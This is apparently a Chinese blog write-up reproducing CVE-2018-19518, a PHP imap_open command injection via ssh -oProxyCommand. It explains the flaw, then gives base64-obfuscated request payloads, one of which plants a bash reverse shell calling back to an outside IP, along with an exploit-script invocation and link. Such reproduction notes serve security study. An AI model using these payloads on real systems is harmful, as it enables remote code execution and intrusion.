---
title: CVE-2018-19518
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-31T17:06:39+08:00
categories: 
- 渗透测试
- 漏洞复现
- Php
---

### 漏洞介绍

PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。

该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。

如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。

#### IMAP

IMAP（Internet Message Access Protocol）是一种电子邮件协议，用于在邮件客户端和邮件服务器之间传递电子邮件。IMAP 是一种客户端/服务器协议，允许用户在多个设备上访问其电子邮件，并在邮件服务器上保留电子邮件的完整副本。

IMAP 协议允许用户通过电子邮件客户端（例如 Microsoft Outlook、Mozilla Thunderbird 等）访问远程邮件服务器上的电子邮件。IMAP 服务器存储用户的电子邮件，客户端可以通过 IMAP 协议连接到服务器，检索和管理电子邮件。

#### imap_open()

`imap_open` 函数是 PHP 中用来连接一个远程的 IMAP (Internet Message Access Protocol) 邮件服务器的函数。它可以让你使用 PHP 脚本来读取和操作远程邮件服务器中的邮件。

```php
resource imap_open(string $mailbox, string $username, string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = array()]]])
```

如果连接成功，则返回一个 IMAP 资源，可用于后续 IMAP 函数调用。如果连接失败，则返回 `false`。

#### -oProxyCommand

`-oProxyCommand` 参数是用于 SSH 客户端命令 `ssh` 的选项之一，它允许用户指定一个命令来代替 SSH 直接连接远程主机。该选项的作用是在 SSH 连接之前执行指定的命令，并将其输出作为 SSH 连接的输入。

具体而言，`-oProxyCommand` 参数可以用于通过一个中间主机（例如跳板机）访问无法直接访问的远程主机。该参数指定的命令可以是一个将本地主机与跳板机连接的命令，也可以是一个将跳板机与远程主机连接的命令。通过这种方式，SSH 客户端可以通过跳板机访问到远程主机，从而实现远程访问。

```
ssh -oProxyCommand="ssh user1@jumpbox nc remote_host 22" user2@remote_host
```

`-oProxyCommand` 参数指定了一个代理命令，它首先通过 SSH 连接到跳板机 `user1@jumpbox`，然后在跳板机上使用 `nc` 命令连接到远程主机 `remote_host` 的 SSH 服务。然后，SSH 客户端使用该连接来访问远程主机 `user2@remote_host`。

### 漏洞影响版本

Ubuntu、Debian、Red Hat、SUSE

PHP 7.2.13， PHP 7.1.25， PHP 7.0.33， PHP 5.6.38已修复该漏洞

### 漏洞利用

根据网上流传的poc

```
hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC9zZGZ6|base64%09-d|sh}&username=111&password=222
```

能够成功写入文件，尝试反弹shell

首先进入容器本身，尝试使用bash命令反弹一个基础shell

![2018](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\2018.png)

测试可行，尝试在外部弹shell,经过测试，使用burp弹shell失败，即使是将状态改成了keep-alive,但是可以通过python脚本建立反向shell

![2018-shell](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\2018-shell.png)

```
python CVE-2018-19518.py 目标ip 目标port self_ip self_port
```

使用的payload，该payload用于写入一个反向shell脚本到/tmp/test,再通过脚本后续执行test文件达到反向shell的目的

```
hostname=x+-oProxyCommand%3decho%09ZWNobyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEyMS4xMzUvNDQ0NCAwPiYxJz4vdG1wL3Rlc3Q%3d|base64%09-d|sh}&username=111&password=222
```

附上脚本地址：https://github.com/houqe/EXP_CVE-2018-19518

### 参考链接

https://nosec.org/home/detail/2044.html

